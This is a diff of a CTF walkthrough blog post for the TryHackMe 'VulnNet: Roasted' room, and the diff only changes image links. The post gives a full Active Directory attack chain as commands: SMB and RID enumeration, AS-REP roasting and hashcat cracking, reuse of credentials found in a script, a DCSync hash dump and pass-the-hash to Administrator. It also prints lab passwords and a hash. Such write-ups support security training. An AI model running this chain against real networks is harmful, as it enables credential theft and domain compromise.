@@ -9,7 +9,7 @@ tags:
   - ctf
 description: "VulnNet Entertainment quickly deployed another management instance on their very broad network…"
 canonical_url: "https://medium.com/@hemanthakrishnach/vulnnet-roasted-tryhackme-challenge-walkthrough-59aa87cbd8a9"
-image: "/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-000-33126f0e.png"
+image: "https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-000-33126f0e.png"
 ---
 
 VulnNet Entertainment quickly deployed another management instance on their very broad network…
@@ -20,11 +20,11 @@ VulnNet Entertainment quickly deployed another management instance on their very
 
 VulnNet Entertainment quickly deployed another management instance on their very broad network…
 
-In this walkthrough, we are tackling “VulnNet: Roasted,” a Windows-based Capture The Flag challenge. We will navigate through open SMB shares, identify employees to build a target list, exploit Kerberos via AS-REP Roasting, and finally leverage DCSync for total domain compromise.![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-000-33126f0e.png)
+In this walkthrough, we are tackling “VulnNet: Roasted,” a Windows-based Capture The Flag challenge. We will navigate through open SMB shares, identify employees to build a target list, exploit Kerberos via AS-REP Roasting, and finally leverage DCSync for total domain compromise.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-000-33126f0e.png)
 
 Room Link: <https://tryhackme.com/room/vulnnetroasted>
 
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-001-5240380e.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-001-5240380e.png)
 
 ### 1. Reconnaissance and Enumeration
 
@@ -32,7 +32,7 @@ We start with a standard Nmap scan to identify the landscape.
 ```bash
 nmap -T4 -p- -A <MACHINE_IP>
 ```
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-002-0ed92f3c.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-002-0ed92f3c.png)
 
 The scan reveals a Windows Server environment (likely Server 2019) with a standard Active Directory port configuration:
 
@@ -42,7 +42,7 @@ With Port 445 open, our first stop is SMB enumeration. We use `NetExec` (formerl
 ```bash
 nxc smb <MACHINE_IP> -u ‘guest’ -p '' --shares
 ```
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-003-87895b5e.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-003-87895b5e.png)
 
 The output confirms guest access is enabled and reveals the domain `vulnnet-rst.local`. More importantly, we see a non-default shares named `VulnNet-Business-Anonymous and VulnNet-Enterprise-Anonymous`with READ permissions.
 
@@ -52,9 +52,9 @@ We connect to the exposed share using `smbclient` to hunt for data.
 ```cpp
 smbclient //<MACHINE_IP>/VulnNet-Business-Anonymous
 ```
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-004-c0db5a0d.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-004-c0db5a0d.png)
 
-Inside, we find three text files: `Business-Manager.txt`, `Business-Sections.txt`, and `Business-Tracking.txt`. Upon downloading and reading these files, we find names of company employees and their roles—gold dust for username enumeration.![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-005-c27f46be.png)![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-006-eeb22345.png)![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-007-3bf4c93f.png)
+Inside, we find three text files: `Business-Manager.txt`, `Business-Sections.txt`, and `Business-Tracking.txt`. Upon downloading and reading these files, we find names of company employees and their roles—gold dust for username enumeration.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-005-c27f46be.png)![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-006-eeb22345.png)![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-007-3bf4c93f.png)
 
 We see something similar in the VulnNet-Enterprise-Anonymous share.
 
@@ -66,9 +66,9 @@ Now let’s query the Domain Controller directly to enumerate built-in accounts 
 ```bash
 nxc smb <MACHINE_IP> -u 'a' -p '' --rid-brute
 ```
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-008-1c33db40.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-008-1c33db40.png)
 
-We create a `users.txt` wordlist![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-009-6347b8cf.png)
+We create a `users.txt` wordlist![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-009-6347b8cf.png)
 
 ### 3. Gaining a Foothold: AS-REP Roasting
 
@@ -78,7 +78,7 @@ We use Impacket’s `GetNPUsers.py`:
 ```bash
 sudo GetNPUsers.py -dc-ip <MACHINE_IP> -usersfile users.txt -no-pass vulnnet-rst.local/
 ```
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-010-e01b9adc.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-010-e01b9adc.png)
 
 Success! The user `t-skid` is vulnerable. The tool outputs a hash starting with `$krb5asrep$23...`
 
@@ -88,7 +88,7 @@ We save the hash to a file and fire up `hashcat` with mode 18200:
 ```bash
 hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-011-4d067301.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-011-4d067301.png)
 
 Hashcat cracks it quickly.
 
@@ -100,24 +100,24 @@ We verify the new credentials and check for access to other shares.
 ```bash
 nxc smb <MACHINE_IP> -u 't-skid' -p 'tj072889*' --shares
 ```
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-012-5853b18f.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-012-5853b18f.png)
 
-The user `t-skid` has READ access to the `NETLOGON` share. We connect and find a suspicious script: `ResetPassword.vbs`![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-013-ce48c63d.png)
+The user `t-skid` has READ access to the `NETLOGON` share. We connect and find a suspicious script: `ResetPassword.vbs`![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-013-ce48c63d.png)
 
 Analyzing the VBS script reveals hardcoded credentials inside the code:
 > `strUserNTName "a-whitehat"``strPassword = "bNdKVkjv3RR9ht"`
 
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-014-0c10e8b6.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-014-0c10e8b6.png)
 
 ### 5. Capturing the User Flag
 
-We test `a-whitehat`'s credentials against the domain. NetExec returns `(Pwn3d!)`, confirming valid access.![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-015-3a4a60fd.png)
+We test `a-whitehat`'s credentials against the domain. NetExec returns `(Pwn3d!)`, confirming valid access.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-015-3a4a60fd.png)
 
 Since the WinRM port (5985) was open during our initial scan, we use `evil-winrm` to log in.
 ```bash
 evil-winrm -i <MACHINE_IP> -u a-whitehat -p 'bNdKVkjv3RR9ht'
 ```
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-016-6883104a.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-016-6883104a.png)
 
 Once inside, we navigate to the desktop of the `enterprise-core-vn` user and capture the first flag.
 
@@ -131,7 +131,7 @@ We run `secretsdump.py` remotely using the credentials we found:
 ```bash
 secretsdump.py vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@<MACHINE_IP>
 ```
-![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-017-e4d7f114.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-017-e4d7f114.png)
 
 The attack works perfectly. We successfully dump the NTLM hashes for the entire domain, including the **Administrator**.
 
@@ -144,7 +144,7 @@ We don’t need to crack the Administrator hash; we can simply “Pass the Hash�
 evil-winrm -i <MACHINE_IP> -u Administrator -H 'c2597747aa5e43022a3a3049a3c3b09d'
 ```
 
-We land in a shell as `Administrator`. We navigate to the Desktop to claim the final prize.![image](/assets/images/posts/vulnnet-roasted-tryhackme-challenge-walkthrough/img-018-83d34b36.png)
+We land in a shell as `Administrator`. We navigate to the Desktop to claim the final prize.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/vulnnet-roasted-tryhackme-challenge-walkthrough/img-018-83d34b36.png)
 
 **Flag Location:** `C:\Users\Administrator\Desktop\system.txt`.
 
